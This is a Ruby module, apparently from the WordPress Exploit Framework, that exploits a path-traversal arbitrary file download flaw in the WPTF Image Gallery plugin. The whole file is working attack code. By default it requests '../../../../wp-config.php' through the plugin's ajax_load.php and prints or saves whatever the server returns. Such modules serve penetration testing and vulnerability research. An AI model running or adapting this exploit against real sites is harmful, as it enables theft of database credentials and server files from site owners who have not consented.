class Wpxf::Auxiliary::WptfImageGalleryArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'WPTF Image Gallery Arbitrary File Download',
      desc: 'This module exploits a vulnerability in all versions of the WPTF '\
            'Image Gallery plugin which allows you to download any arbitrary '\
            'file accessible by the user the web server is running as.',
      author: [
        'Larry W. Cashdollar',             # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8106'],
        ['URL', 'http://www.vapid.dhs.org/advisory.php?v=148'],
        ['EDB', '37751']
      ],
      date: 'Jun 17 2015'
    )

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: 'The relative or absolute path to the remote file to download',
        required: true,
        default: '../../../../wp-config.php'
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('wptf-image-gallery')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'wptf-image-gallery', 'lib-mbox', 'ajax_load.php')
  end

  def run
    return false unless super

    res = nil

    if export_path.nil?
      emit_info 'Requesting file...'
      res = execute_get_request(
        url: downloader_url,
        params: { 'url' => remote_file }
      )
    else
      emit_info 'Downloading file...'
      res = download_file(
        url: downloader_url,
        method: :get,
        params: { 'url' => remote_file },
        local_filename: export_path
      )
    end

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downlaoded file to #{export_path}"
    end

    return true
  end
end
